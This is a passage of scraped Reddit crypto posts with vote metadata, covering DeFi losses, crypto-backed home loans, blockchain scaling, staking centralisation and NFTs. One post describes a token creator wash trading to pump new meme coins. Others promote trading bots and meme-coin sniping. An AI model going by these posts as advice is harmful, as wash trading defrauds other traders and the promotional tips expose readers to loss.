payment for an apartment. finally coming to terms with that gave me cathartic release. anyway, i wasn't perturbed. i knew my risks going in, i just wish i followed my own advice a bit better. from then on, i decided to write my own investing rules. for example, no trading on my phone. no re-entering a project that i just exited, because i probably exited for a good reason. anyway, i started investing in stuff i really saw long term value in, and that's given me a lot of peace of mind since. i don't watch the price as closely anymore, cos that didn't matter to me as long as the team behind the token was building things and had sound ideas. that's what got me to invest in luna and the terra ecosystem, and finally, that paid off recently when it hit $9. i knew it might be temporary, and yeah, at the time of writing it's receded back down to something like $6.30, but i still believe in it, and i trust my convictions and instincts. i realized that community has value in defi. dracula, bayc, punks, and ohm would be nothing without their stalwart meme lords and smoothbrained apr-crunchers. i make sure that every project i'm in now has a great community that's able to welcome newcomers, and also discuss high level tokenomics while explaining it to layman terms. i'm also invested in a few other projects that i think have long term value, and i've reduced my polygon holdings to less than 1/5th of what it was before. most of it is in balancer, which is simply a great way to diversify your assets. the rest is in a dividends contract with a yield aggregator. i'm not done with farming coins, but i'm definitely allocating my risk better now. i think titan was my biggest lesson to date, and though i wish it did not happen, i still got something out of it. from now on, my instincts will be sharper, and my nose for good/bad fundementals will be too. most of my journey and thoughts i post on twitter, including a spreadsheet and guide on how to use mirror protocol v2. you can check it out at [twitter](http://www.twitter.com/drcle4n) i hope that this thread was a good read for you, and that you gain something from my experience. if you'd like to have a conversation, or if you have any thoughts/questions, do feel free to comment, or drop me a dm on twitter where i'm more active. i'd love to engage with you. tl;dr i spent six months in defi, got rekt multiple times including with titan. i recovered, learning from my mistakes, and started investing in long term projects instead, especially the ones with a great community. since then, i sleep a lot better.",187,113,0.98,2021-07-17

Borrowing from crypto to buy a house,"someone was talking to me about borrowing from their crypto portfolio to buy a house, it seemed interesting and i just wanted to understand more about it as maybe it's something i might consider. what the plan is: 1. take $1,000,000 to fund a stablecoin lp. 2. take the stablecoin lp and put it up as collateral on something like abracadabra (if they ever had mim available) or defrost. and borrow about $900,000 in the platform's stablecoin. 3. sell that stablecoin for usd, and use that usd to buy a house. 4. you have a $900,000 house, and a $1,000,000 lp token still earning fees that you can use to pay down the loan. what are the risks here? it seems that if the lp goes to hell, you still have your $900,000 house. you just lose the $100,000 extra bit of excess collateral. if this has been going fine for a period, maybe the interest earned has covered the excess collateral. &#x200b; **specific questions** what exactly happens to my lp token when i post it as collateral? does it get transferred to the lending platform? is it possible that i could be unfairly liquidated? how do i receive earnings on lp tokens i post as collateral? i know the rate i'm earning on the lp could be variable, but is the interest rate of the borrowing fixed? what are the risks of being liquidated if i'm posting a stablecoin lp token as collateral? **if things are all good, i'm imagining at the extreme i could sell all my real world items for lp-tokens, borrow against the lp token, buy most of it back, and still earn on the lp token. practically earning on double the asset base.**",131,197,0.95,2022-02-17 09:53:13,web3,defi,monodactyl,False,166.9

The Limits to Blockchain Scalability ~vitalik,"[the limits to blockchain scalability](https://vitalik.ca/general/2021/05/23/scaling.html) ~/u/vbuterin i found this paper on another crypto sub, vitalik discusses the limits of how far blockchain can scale. there are some interesting points made e.g. blocksize limits and why the size of a block can only be pushed so far in intervals of 1 min (not very large) there is a lot more in this paper from examining blocksize, sharding, storage and bandwidth. all have limits, and will never out perform a centralised service e.g. an amazon ec2 cluster in the same region. here is the summary at the end of the paper: > **summary** > there are two ways to try to scale a blockchain: fundamental technical improvements, and simply increasing the parameters. increasing the parameters sounds very attractive at first: if you do the math on a napkin, it is easy to convince yourself that a consumer laptop can process thousands of transactions per second, no zk-snarks or rollups or sharding required. unfortunately, there are many subtle reasons why this approach is fundamentally flawed. > computers running blockchain nodes cannot spend 100% of cpu power validating the chain; they need a large safety margin to resist unexpected dos attacks, they need spare capacity for tasks like processing transactions in the mempool, and you don't want running a node on a computer to make that computer unusable for any other applications at the same time. bandwidth similarly has overhead: a 10 mb/s connection does not mean you can have a 10 megabyte block every second! a 1-5 megabyte block every 12 seconds, maybe. and it is the same with storage. increasing hardware requirements for running a node and limiting node-running to specialized actors is not a solution. for a blockchain to be decentralized, it's crucially important for regular users to be able to run a node, and to have a culture where running nodes is a common activity. > fundamental technical improvements, on the other hand, can work. currently, the main bottleneck in ethereum is storage size, and statelessness and state expiry can fix this and allow an increase of perhaps up to ~3x - but not more, as we want running a node to become easier than it is today. sharded blockchains can scale much further, because no single node in a sharded blockchain needs to process every transaction. but even there, there are limits to capacity: as capacity goes up, the minimum safe user count goes up, and the cost of archiving the chain (and the risk that data is lost if no one bothers to archive the chain) goes up. but we don't have to worry too much: those limits are high enough that we can probably process over a million transactions per second with the full security of a blockchain. but it's going to take work to do this without sacrificing the decentralization that makes blockchains so valuable.",204,86,0.99,2021-05-23 17:39:52,web3,CryptoTechnology,Neophyte-,False,166.7

Why 99% of cryptocurrencies centralize over time + a way to possibly fix this,"tl;dr my thesis in this post is that cryptocurrencies relying on proof of work (pow) or proof of stake (pos) for consensus centralize over time, leading to degraded security. an expanding money supply, fees, and staking **encourage** a loss in stall resistance and a loss in security. very few crypto, amongst which nano, are likely to stay secure over time. this post is not meant as a nano shill post, but one of the reasons i got into nano is that i believe it solves these issues. feel free to comment solely about the pow/pos centralizing thesis. # zooming in on bitcoin’s incentive structure bitcoin mining offers rewards. these rewards consist of a block subsidy (supply increase, currently 6.25 btc per block) and fees ([\~0.5 btc per block](https://bitinfocharts.com/bitcoin/)), and are distributed roughly proportionally to hashrate owners. bitcoin mining is a business. a big one, with daily revenue of[ \~$30 mln](https://ycharts.com/indicators/bitcoin_miners_revenue_per_day). it’s a business focused on ruthless cost efficiency, because the revenue side (bitcoin’s price) is largely unchangeable by bitcoin miners. miners’ total costs consist of energy costs, asic purchases/writedowns, capital costs, rent of the location, maintenance, etc. almost all these costs have economies of scale associated with them. a larger miner has a stronger negotiating position for asics. they have a stronger negotiating position for energy contracts. they have access to cheaper capital. they can more efficiently maintain their asics. combine mining rewards with economies of scale for mining, and what you get is centralization over time. the largest miners have the lowest cost-base, make the most profit, are able to reinvest more in asics, and increase their share of consensus over time. this isn’t some radical, unsupported take. the theory is quite clear for more sectors than just bitcoin mining, and is why we tend to have anti-trust legislation in most countries. research on specifically bitcoin corroborates this, see some of the papers linked at the bottom of this article. **fud, china is banning mining so miners will disperse more broadly, we have stratum v2 coming, miners will join different mining pools, nodes are the ones that matter not miners, we don’t see 80% belonging to one miner now!** none of the above changes the centralization in consensus power over time. it doesn’t change the economic rationale. china banning mining means there is **less** dispersion in the long run, as there are now fewer locations where mining is possible. stratum doesn’t fix the incentives. miners can join different mining pools ([though history shows they don’t](https://en.wikipedia.org/wiki/ghash.io)) to increase apparent decentralization, but it won’t fix centralization over time of the underlying miners. not to mention that mining pools themselves are far more centralized than most people think (see “[a deep dive into bitcoin mining pools](https://weis2019.econinfosec.org/wp-content/uploads/sites/6/2019/05/weis_2019_paper_30.pdf)”). nodes can check and verify the chain, but those with the consensus power decide whether to include transactions. if i owned a majority of mining power, i wouldn’t shout it off the rooftops. i would send in increasingly higher fee transactions, forcing people to “overbid me” to process their transaction. unbelievable? see [miner collusion and the bitcoin protocol](https://cowles.yale.edu/3a/parlour-miner-collusion-and-bitcoin-protocol.pdf) to learn how hundreds of millions in excess fees are already being paid. those invested in pow-based coins other than bitcoin might think that their cryptocurrency solves this. maybe it does, however generally this is not the case. the incentives and the trend are the same for all cryptocurrencies with pow consensus. bitcoin is the most visible, the one that most research has been done on, but the underlying incentives are the same for other pow coins. perhaps you’re invested in a pos coin. [mining is terrible for the planet anyway](https://senatus.substack.com/p/swap-bitcoin-for-nano-save-the-planet), so why not? while pos has its advantages (and disadvantages) relative to pow, it is definitely not immune from centralization over time. the largest stake-holders grow fastest through several avenues. a large holder is able to lock up a larger percentage of their coins, since one only needs so many coins for daily usage. the higher the percentage of coins you can stake, the higher your return will be. most staking is done using pools. setting up a pool tends to come with some costs, making it impossible for small holders to set up their own pool. as an example, ethereum requires 32 eth staked (\~$60,000) to participate in validation. if you do not have 32 eth, you have to join a pool to stake. these pools typically charge [either a fixed fee per month or a percentage](https://defirate.com/staking/) (10–25%). this fee again goes to larger holders. finally, large holders lose a lower percentage of their coins to transaction fees, which are denominated in absolute terms rather than relative to amount transacted. when you hold $100 and pay a transaction fee of $1 this has a far larger impact than someone holding $100,000 having to pay a transaction fee of $1. some pos cryptocurrencies try to make the network seem more decentralized through maximizing the size of a single pool, which is a bit like saying that we can increase bitcoin’s decentralization by splitting antpool into ant and pool. nothing has changed. if anything, this muddies the waters by obscuring how centralized the system really is. # a possible solution to the centralization issue the common thread in both pos and pow is that there are monetary rewards. these rewards are offered in compensation for investing in hash power, for locking up a stake, for securing the network. monetary rewards are the incentive necessary to make people spend money on mining equipment and energy, to render their coins less usable, or otherwise incur some form of risk or cost. the simplest solution then is to remove these monetary rewards. remove block subsidies, remove fees, and there is no centralization over time inherent in the protocol as the big do not get bigger. while this would likely get rid of centralization over time, it would also make bitcoin and other pow/pos coins insecure. miners would stop mining, stakers would stop staking. hashrate would drop, leaving bitcoin vulnerable to any miners turning their asics back on. however, the cryptocurrency space does not end at bitcoin. nano is a cryptocurrency that tried such a radically different design. with zero fees and zero inflation, direct monetary rewards for validation are absent. without these monetary rewards, the inherent pressure of centralization over time is removed. the challenge of ensuring security is solved by creating a network that is valuable in and of itself, that adds value to those using it. nano offers instant and feeless transfers, it offers a green, decentralized and fixed supply store of value. so how does this incentivize people and businesses to secure the network? instant and feeless payments are attractive for merchants. for trustless and direct access to the network, they need to run a node (at \~$20 a month). for exchanges to be able to confirm that the nano deposit that was made to them is actually valid, they would prefer to not rely on any third party. they run their own node. large nano holders want to ensure the continued security of the network, and run a node. this theory has played out well for over five years already. exchanges such as binance, kraken, huobi and kucoin run nodes. nano wallets, such as [natrium](https://natrium.io/), [wenano](https://wenano.net/) and atomic wallet run nodes. businesses building on the nano network such as [wirex](https://community.wirexapp.com/t/wirex-nano-a-match-made-in-heaven/16426), [kappture](https://www.kappture.co.uk/cryptocurrency.html) and [465di](https://np.reddit.com/r/nanocurrency/comments/m13hxe/465_digitial_investments_let_me_introduce/) run nodes. hundreds of other nodes are also run, by small businesses, enthusiasts or large holders. through a combination of incentives and nodes being relatively cheap, there has never been a lack of validators in nano. validators are not all treated equally. if 1 node was 1 vote, a malicious entity could spin up a lot of nodes to control consensus. nano employs a voting-weight system to protect against this. just like anyone can run a node and become a validator, any nano holder can use their nano to vote for any node. votes can be changed at any time. to get to consensus on a transaction, 67% of total online voting power must confirm a transaction. simply setting up a node therefore does nothing. you need to have nano voting weight, where 1 nano = 1 vote. on the voting level, incentives are again clear and aligned. without fees and without monetary rewards, there is no reason for any validator to want a large share of voting power. as a nano holder, there is no reason to vote for a representative with a lot of votes already — the incentive is to spread out voting power. doing so increases stall resistance, increases security, and increases the value of their own investment. nano holders have no reason to vote for those with large amounts of voting weight, and any node trying to gain a large amount of consensus power would rightly be looked upon with suspicion and see votes flow away. # does it work? nano has had a decentralized mainnet running for over 5 years. without a cent paid in fees and with the supply fixed since the very start, the incentives have never changed. in that time, over the course of \~120 million transactions, nano has never had a double-spend nor chain reorg, something many other cryptocurrencies can’t say. over the course of these years, there have consistently been many validators running, validating the theory that without fees and inflation, there is enough reason to run validators. without mining and without staking in nano, centralization over time is absent from nano at a core level, leading me to believe that unlike 99% of cryptocurrencies it has its incentive structure properly aligned. *thank you for reading, i'd love to hear comments and feedback both on what you think about the centralization over time in pow/pos coins and what you think about the solution that nano presents. i see this centralization issue as one of the most important issues at the very core of crypto, so i'd love feedback on this.* &#x200b; 1.

The risks of staking for the long-term crypto environment,"(originally posted as a medium article and on r/cc, hoping for some better discussion here) staking is one of the more recent buzzwords in crypto. it allows you to earn “passive income”. different chains offer different implementations of staking. some make staking very easy, some have high returns on staking, and in all cases you supposedly help secure the network. in this post, i explain why if you are invested in a proof of stake crypto you might want to dig deeper into your choice as all might not be as rosy as it seems. # pointless staking yield what makes most people enthusiastic about staking is that by staking, you earn more tokens as a reward. you make money, without doing anything! these tokens have to come from somewhere. in most projects, staking rewards come primarily from supply inflation. you might receive a 6% yield on your tokens, which seems fantastic until you realise that the supply is also expanding at 6% per year. in other words — in this case you’re not actually gaining anything. when you hold 100 tokens out of a total of 1000 and get 6 extra tokens at the end of a year, you’re not gaining when the total supply has increased to 1060. in both cases, you hold 10% of the supply. this is what i would call pointless staking in its most extreme form. not all staking cryptos pay for the yield purely by increasing the supply. this brings us to the next aspect of staking. #redistribution through staking when staking isn’t as simple as everyone gaining an equal percentage, there inherently has to be some redistribution. it might be that you gain 7%, while supply only increases by 6%. this is only possible if not everyone gains 7%. how is this possible? there are two options, broadly speaking: 1. yield consists of a combination of inflation and fees paid or; 1. yield is paid from block rewards increasing supply, but supply is at the same time decreased through burning transaction fees. the first option is the most basic and oldest form of staking, and is most comparable to proof of work. in proof of work, you gain a block subsidy for mining a block, and you get the fees paid for the transactions in the block. the same holds true in staking. stakers are paid (a percentage of) the block reward and fees paid for transactions. the 7% staking reward you get might therefore come from increased supply (6%) and from fees paid (1%). the second option is an option that tries to hide the centralization over time by not having fees accrue to stakers but rather having them burnt. this means that the fees are sent to a burn account, that cannot be accessed. as an example, stakers might get a 7% staking reward, which consists of 5% block rewards, and a 2% decrease in supply due to fees being burnt. while good for you as a staker, there is an obvious downside to both options. # discouragement of using the crypto if you pay fees to use the chain, while getting staking rewards for not using the chain, there is a clear disconnect. those using the chain will hold less and less of the supply, while those staking hold an ever larger share of the supply. while you as a staker would be happy with the yield you are getting, users would clearly be happier if they could pay lower fees, and might look to cheaper and more efficient solutions. perhaps those staking also have an interest in using the network sporadically. in this case, staking still leads to centralization over time. fees are denoted in absolute terms (say 0.1 xyz), rather than relative to your holdings. if small and big holders both transact, the small holder is paying a far larger percentage of his holdings in fees than the large holder is. in a scenario where small holders hold 1 xyz, large holders hold 1000 xyz, and transaction fees are 0.1 xyz, a single transaction costs a painful 10% of the holdings of the small holder, while the large holder would barely feel the 0.0001% fee. double discouragement through lock-up periods it potentially gets even worse. many staking cryptocurrencies force you to lock up your crypto to receive staking rewards. this is the model eth2 is using as well. when you lock up your tokens, you can’t use them until after the lock-up period. as a small holder, you might be okay locking up some of your tokens (longer-term savings), but you also need some tokens for usage. a large holder might also want to use some of their tokens occasionally, but can lock up a far larger percentage. we see this in traditional finance — the richer you are, the larger the percentage of your net worth that is invested rather than in cash. because of this, while you might get just 5% on your total holdings as you keep some funds available to use, large holders might be getting 6.9% as they are able to lock up almost all their tokens. further centralization through staking pools taking eth2 as an example again, setting up a staking pool is not cheap. eth requires 32 eth staked (~$100k) to participate in validation. if you don’t have 32 eth, which many of us do not, you have to join a pool to stake. pools charge fees for this, either a fixed fee per month or a percentage (10–25%). this fee once again accrues to larger holders. in other chains such as cardano setting up a stake pool is far cheaper. regardless, the same holds true. there are costs to set up a stake pool, and there are fees associated with joining a stake pool. those with large holdings become ever larger, while small holders hold relatively less and less. #summarizing the futility of staking proof of stake has two possible results. either everyone stakes, no redistribution happens, and nothing is gained for anyone through staking. the other option is that not everyone is rewarded equally for staking, causing redistribution. this redistribution inevitably accrues to the largest holders, causing centralization of consensus power and supply over time. because of this, i believe that proof of stake makes small holders relatively poorer, rather than richer. at the same time, staking decreases decentralization & security, therefore decreasing the value of the protocol as a whole. for those interested, i’ve written about methods to avoid [centralization over time](https://senatus.substack.com/p/why-99-of-cryptocurrencies-centralize). i’ve also [written about nano](https://senatus.substack.com/p/the-basics-of-nano-why-its-such-an), a cryptocurrency that has 0% inflation, 0 fees, and that remains decentralized and secure over time. thanks for reading. comments and feedback are always appreciated.",161,134,0.92,2021-09-14 06:08:27,web3,CryptoTechnology,SenatusSPQR,False,159.39999999999998

A lot of FUD is being spread about Solana. I still had tx go thru all weekend for just $0.20-$1.50,"edit: i keep getting hateful comments directed at me with bogus reasoning and then they block me right after so i cannot even reply. there was 5 people like this already. this is coordinated by base telegram groups (and really the billionaires in ethererum who want to destroy solana as its getting all the new users in crypto while eth is dying). post is also being heavily brigaded by base shills (who get paid like $5 a day to shill for base and are being extremely toxic. got nothing but love ever since i joined the solana community. they are not winning anyone over this way. ) ---- solana still is perfectly reliable i was having 1sec transactions go thru all weekend until today and its still working rn. using a bot.they have their own rpc so they do not have dropped transactions like raydium (and now even jupiter since yesterday). the fee was up to $1.50 but yesterday i tried and $0.20 still went thru after a few seconds - using the bot. now i wonder how you could make a $1.50 swap go thru on ethereum.... warning: know what you are doing. the fees can wipe you out quick with these bots especially if you just do ~ 0.1 sol transactions to buy meme or whatever. especially the bribe fee (its the 2nd fee in their settings). as this fee you will always have to pay for every tx that you sent - even if it does not go thru. i would suggest taking a look at the settings. i would suggest just trying a priority fee of 0.002 and then see if tx go thru. so turn the 2nd fee off (its on by default) because earlier i did not even need it. if your tx should not go thru, just raise it slightly. also note you have to set this for both buy and sell. its easy to forget this when your brain gets in degen trading mode and you just want to buy up that meme quick - or sell it.. in addition, you must write down the private key you get from there, and store it safely. you can also add it in your phantom wallet so then you have the exact tokens from the bot also in your own wallet. warning again: check the fees and make sure you know what you are doing. best you do the quick math howuch 0.01 sol is (about $2/well $1.70 rn). and another tip.. i would suggest connecting a dummy wallet to it. its not really needed but thats always safer. you can still top up the bot from any wallet by just sending sol to your wallet address in the bot. what i did was starting slow just sending 0.5 sol to test it out and i suggest you do the same. (and if you just trade with very low amounts, i would say the bot is not really worth it, unless you actually do set the fees extremely low like in the example. but note even like $1 a tx would cost you already $2 so going in coins for $5 or $10 becomes pretty expensive. also this platform takes a fee for their service of 1% of every transaction (so if you trade 1 sol,they take 0.01 sol in addition to the network fees). the bot is this [one](https://photon-sol.tinyastro.io/@bestsolanabot)",84,254,0.67,2024-04-09 07:34:43,web3,solana,btcangl,False,158.7

A possible explanation for the price action of ETH,"the election of trump shows us that people choose nowadays to follow simple stories rather than complex truths. repeat over and over simple stories and people gather around. the appealing story that is repeated over and over on coindesk, cnbc, forbes, twitter, reddit, youtube is ""solana is faster and cheaper than ethereum and will replace this old tech"". the ethereum foundation would not waste money hiring a team of communicative people to explain to journalists, economists, politicians, on youtube, etc what ethereum is and does. **for example** thanks to a series of past upgrades, fees in the ethereum ecosystem have been lower than solana's for months while the speed (number of transactions per second) has been equivalent (solana cheats by counting protocol messages). on the monetary side, the number of existing eth has been decreasing since the merge (comparable to stock buybacks) whereas sol inflates at +5% per year. --- ps. why the hype around solana is a simple story too beautiful to be true: the number of validators on solana is very low* and so low that the operators colluded several times to halt the network, and recently to push an emergency upgrade. the whole point of the concept of blockchain is decentralisation (meaning _impossibility to collude_), otherwise the blockchain is just a database managed by a few people, which doesn't bring any advantage. solana is a database. \* it is low because they are losing money, which is a unique situation (i would say a flaw) in the world of blockchains, caused by the extremely high hardware and bandwidth requirements. they lose money despite creating +5% coins per year. meanwhile, the number of existing eth has been decreasing since the merge and ethereum validators are profitable.",116,205,0.66,2024-11-17 11:41:09,web3,CryptoCurrency,barthib,False,158.2

Are NFTs really meant to be a quick and ephemeral trend?,"so we all know the controversies surrounding nfts and the whole ""just screenshot"" comments. but do you think nfts that aren't specifically limited to jpegs might actually solve a lot of problems for a myriad of musicians, artists, authors etc? for example, music based nfts remove the middlemen from the process and the musicians themselves may actually earn a lot more for their own work than they otherwise would. i may be mistaken but i think xdb offers this or has previously mentioned it. plus, fractionalized nfts like deip offers options such as publishing too? what about those benefiting small authors that may not have the privileges to get published with the big five publishing companies or have the finances to pay for their submissions to button poetry yearly? this is where the actual utilities and benefits of nfts begin. being able to have more than one owner per nft, intangible assets like trademarks and a vast selection of so many other advantages. thoughts?",76,253,0.89,2022-01-18 13:51:25,web3,CryptoTechnology,Accomplished_Mess116,False,155.70000000000002

How to find meme coins early - a complete guide,"okay so i got a lot of responses to my 'how to buy meme coins - a complete guide' post, and everyone asked me the same question - ""how do i find meme coins early?"". if you'd like to read that post, it's [here](https://www.reddit.com/r/solana/comments/1d4uxnp/how_to_buy_meme_coins_in_2024_a_complete_guide/) i've asked in several places what people's strategies are, i'm inside a ton of telegram groups, and i've honestly made some good money selling coins (my best return was a whopping 150x). i'm going to share what has worked for me. there are three main strategies to finding meme coins 1. **understand it is a full time job** the people winning are plugged into twitter, reddit, and telegram 24/7. they have notifications on for the right influencers and are literally online all the time. to catch a coin at the right time, and early, it makes obvious sense that you have to be alert. i understand it's tough to be online all the time - a lot of us have bills to pay and can't snipe a coin while at work or when driving to pick the children up from school. a few tips to be online 24/7 without having to be online all the time. * turn off all your notifications other than twitter and telegram * set notifications for the right influencers * set notifications for the right telegram groups * keep your eyes on the news * open twitter once an hour (seriously) * use a mobile friendly trading platform. swapping with your wallet while on the go sucks. i've lost out on countless early coins because raydium is so slow and my phantom browser didn't load the website. i switched over to bonkbot on telegram, and if that's not your cup of tea, there's another platform, [movement.market](http://movement.market), that has a mobile app where you can just buy and sell meme coins directly with an email and credit card. 2a. **find the right influencers** now when i say find the right influencers, i'm sure you're like, how? well, it's difficult. there are few i'll give right now - but be careful, they're smart. sometimes they shill a coin and dump super early. it's a dog eat dog world in crypto. regardless, here are a few. make a new account and follow them, and then twitter will do it's thing and suggest similar people to follow. 1. kookcapitalllc 2. blknoiz06 3. themisterfrog 4. nobrainflip 5. slitn3y 6. degeneratenews 7. metaversejoji 8. decu0x 9. dexnfts 10. kingwilliamdefi 2b. **get in the right telegram groups** so it's quite difficult to get in the right telegram groups. everyone claiming 'alpha' is just buying early and then dumping on the alpha group. it's very difficult to get critical mass, so this is an incredibly profitable strategy. a lot of devs and influencers do this, and quite frankly, its really smart. you need to be able to discern the scammer alpha groups from the real ones. here's how you do that 1. join a bunch of telegram channels that influencers are shilling, i'd say a minimum of 20 2. keep notifications off for everything but those channels 3. if more than 3 of the channels are talking about the same coin at the same time - that's a good signal. you \*might\* have found a coin. **3. follow the news and twitter memes** the news makes it possible to figure out what's going to get launched. anything that's mainstream news will get memed. and anyone who is saying bad things about crypto will get memed. the jason calacanis coin was an easy win. he was talking about meme coins and getting a lot of hate. when i saw his coin in the tg groups i immediately sniped it. massive coins also have sub coins that do well but not 100x. jeo boden created justin turdeau, nonsee pelonsee, etc. these don't pass $1m but still hit $400k-$500k. the same has happened with influencers. when people miss out on the first one, they want to join the second one. iggy's coin hit $100m, caitlyn jenner hit $10m and soulja boy $5m. you can see for yourself here : [https://movement.market/categories/influencers](https://movement.market/categories/influencers) **conclusion** if you are not systematic and smart about this you will most probably lose all your money. you are trading against influencers and insiders in private groups. be sharp and only set aside money you can afford to lose. this is extremely risky business. happy trading, i hope you make a lot of money! dm me if you have any questions - i love this space. it's finally a way for hard working people to actually escape the nine to five grind - but only if they're smart about it!",174,97,0.98,2024-06-04 10:43:39,web3,solana,fireyoutubevids,False,153.0

After being in crypto for years... I finally made it. How I became a memecoin creator.,"i finally fucking made it. after years and years of studying, researching, and observing these markets.. it has finally happened. i bought my first bitcoins for 30$.. so i've been around for a while but was always a ""user"" of the currency rather than an investor. silk road amirite? life happens and crypto is a currency. and that's what i've always used it for every time i needed money. that being said, being into crypto for that long and not having anything to show for it.. well.. its not a good feeling. so i decided this would be my cycle. i started with only $100. and honestly got lucky with a few memes early on which got me to $2k. that's when i decided to start looking into making the coins. it seemed that's where i could really start to make some money. but everyone thinks this.. right? i did what almost all new meme coins creators do and focused mostly on trying to build a community first with website, tg, and all that stuff. i then locked 1500$ up in an lp and launched it. this would be my ticket to freedom. nice green candle to start, immediately followed by a big red candle... to my surprise, there were no new buys coming in. the chart got stuck. where was my ""community"" to pump the price and buy it? after about 30 minutes without a buy, i begrudgingly sold my small allocation and was only able to salvage about 300$ from the locked lp. a total flop. that experience changed my entire outlook on how meme coins should actually be launched. i spent about 2 weeks tracking launches, wallets, charts and basically anything i could. i started seeing patterns in the coins that took off, and the ones that were rugs. all of these coins that weren't rugs and started to climb all had the same pattern. huge initial volume and a few accounts eating sell pressure. so i wrote a program to help with these things and it was time to try again. but it wouldn't be cheap. i needed at least $10k to do this right this time. i didn't have close to 10k but there were 2 people i met in a discord that i would share ideas with and they knew i was determined to make this work. we made a deal where they could keep control of (most of) their investment and i'd run to the token. we launched and each made $1k. it was the most stressful hour i've ever had. but my theory worked and it wasnt a rug. it was legit, and it was fair. it wasnt huge money, but it showed me and them that this system worked. things snowballed from there. made connections with influencers, made the program better, and really honed in on things that worked and things that didn't. im not going to share how much ive made but its certainly life changing. im happy. beyond happy actually. but there's a few points id like to make about meme coin creation that people don't seem to understand. 1. it's not as easy as everyone thinks. you don't just launch a coin and it takes off and u get rich. it doesn't matter if it's the funniest best most based meme ever. without the proper marketing and connections, bankroll, and most importantly.. market making. you're coin isn't going to take off. if it was easy, everyone would be doing it. 2. dev profit on coins is not as much as everyone thinks. sure if it goes to 20 million and dev didn't sell anything... they'll make some serious bank. but 99.9% of coins die within an hour or 2. so i would try to sell 95% of my tokens in that time period. if you dont take your profits there, most of the time you'll end up losing money. ~$4-5k was average profit on coins launched. lower than what most of you would think. but when you dont rug or dump all in one clip to nuke the chart, its much harder to extract your value. which brings me to number 3... 3. basically all volume in the beginning is the dev wash trading and buying the token. 2 things drive a token at the start. volume and price action. you need both. price needs to keep going up, so it's my responsibility to make sure it does. so im buying every red candle. there were times i got dumped on so hard in the first 5 minutes. id be down 20 sol but kept supporting price. so it may look like the dev was making huge profits, but no one accounts for all the tokens they purchase while getting dumped on at the start. those losses hugely offset the profit. 4. socials don't matter until 10 minutes after you launch. before that, it's only degen gamblers. and degens don't have time to check socials. they want to be early and checking all of that takes time. socials matter once you hit about 50-100k mc. before that, useless. 5. for 1 person to make money, others have to lose money. it needs to come from somewhere. so no matter how high your coin goes, there will always be people losing money and calling the dev a scammer. there's no avoiding this. i've moved on to consulting for other people/teams now. less stressful, a guaranteed fixed pay check, and no more risking huge amounts of sol every launch. this past year has been a complete whirlwind and to come from nothing to this.. its quite amazing. good luck out there.",112,186,0.81,2024-05-28 12:06:51,web3,solana,DawnCD2,False,149.70000000000002

Giving life to NFT's,"hello community, in my understanding, current non fungible tokens (nft) technology is just a pointer to a specific image file stored on a blockchain. the owner of the nft is the owner of the image on the blockchain but the image data itself can easily be copied and shared. so basically current nft standards are more or less like a database entry stating that someone owns something. what if we could easily change that? imagine an nft standard that is constantly changing the data of the stored image via a verifiable random function (vrf) that is algorithmically changing based on the passage of time? when talking about blockchains i'm always talking about the internet of values and that blockchains are the closest resemblance of biological evolutionary processes mirrored onto the digital realm. implementing a function on nft's so they can age on a verifiable basis but without the possibility to replicate the input function, wouldn't this completely change the value proposition of ""just an image""? if you for example copy and paste the image, you can never truly own the ""actual image"" because it is always changing on a mathematical basis that you cannot artificially replicate. so basically what this means in my thought structure is, that the image lives only on the blockchain and only the owner of the nft with the implemented vrf will ever truly be the owner of the image. i'm open to your thoughts on my idea and please correct me if some of my fundamentals are incorrect. edit: another idea that just arose due to the discussion. wouldn't it also be amazing to be able to create nft's that algorithmically age based on their digital age? like mirroring not only the passing time but also the atomic decay on a digital level? imagine an nft that ages like the mona lisa does. there could potentially be a whole industry around who creates the best algorithm to most closely resemble ""real life"" decay on different digital entities. i have even more ideas about nft's but for now i'll leave it be with the atomic decay :d edit 2: i know that i wrote that an image is stored on a blockchain. there are solutions that enable decentralised storage based on blockchain technology, so even though the term ""storing an image on a blockchain"" may not be correct, there are solutions to do it. it depends on the technology that is being used, but also on how you define it. let's just no try to crush our thought experiment with too many technical barriers, this thread is more about imagination of what could be possible.",56,263,0.82,2022-01-10 05:24:52,web3,CryptoTechnology,[deleted],False,147.0
ELI5 Interoperability: cosmos vs polkadot,"i've been trying to understand interoperability of blockchains, specifically cosmos and polkadot. i have no expert knowledge of cryptography or blockchains, but i really wanna understand which is the optimal interoperability method. i mean, cosmos sdk seems pretty dope, given that loads of the top projects like bnb and luna are built on them, hence transferring tokens between these chains are already possible. i guess cosmos's inter blockchain communication (ibc) is pretty dope too. heck, it even supports btc. on the other hand we have polkadot, with its relay chain as the central point almost, and its parachains as ""outer"" blockchains. each parachain can be very different, but all parachains can interoperate seemlessly. even the ethereum bridge is dope. i've also heard of solana's wormhole, but don't know much about it. how do these methods compare? i mean for things like transaction cost and speed, independence from third parties? i know there have been wrapped tokens in the past, but the above methods seem very different. please keep the explanations simple! i don't understand crypto tech under the hood. thanks in advance!",99,194,0.99,2022-01-09 04:21:54,web3,CryptoTechnology,yasserius,False,146.9

Why white papers in crypto world are so unprofessional?,"first of all, i come from the academia and so i spend a significant part of my day reading peer reviewed research papers. one of the first things i learned in crypto is that each project seem to have a so called 'white paper' where the team behind the project publishes their vision for the future, main ideas, some mathematical analysis and how they are going to achieve their promises. while i wasn't expecting the standard to be so high, i still was expecting these papers to be good considering that in most cases the team has multiple people working there and the projects are asking for millions of dollars. to my surprise, i was absolutely shocked when i started reading these papers. the vast majority of them seem to be utter trash. tron whitepaper if was submitted as an assignment in any university would have been a fail without question. even projects that seem to interest me like bounty0x seem to have basic problems with formatting (seriously guys, why do you not use latex in your paper instead of word, especially considering that every team has someone who did some computer science uni when it is anathema to send an assignment in word) which make me immediately less interested in putting money there. i mean, if a company asking for tens of millions of dollars cannot manage writing in a way that a second year university student can, then how am i to trust them with my money (i like bounty project though). now i know that most of the marketing is done in twitter, but it shouldn't be that difficult to do some work in the fundamentals too. just to give some balance, i like a lot the btc paper, and if you read that and then you read a paper of a modern alt-coin immediately, you are going to vomit. ethereum white paper while written in a blog-like style is a joy to read. from the recent ones, xlm and bat papers are written well and scream professionalism, which made me interested to read them and then to start doing research on those coins. disclaimer: this post is not shilling, neither criticizing the projects itself, it is more to criticize the way how the ideas of the projects were put forward. i own xlm and bat, i have owned trx, btc and eth.",173,83,0.96,2018-01-08 16:38:54,web3,CryptoTechnology,ilielezi,False,146.6

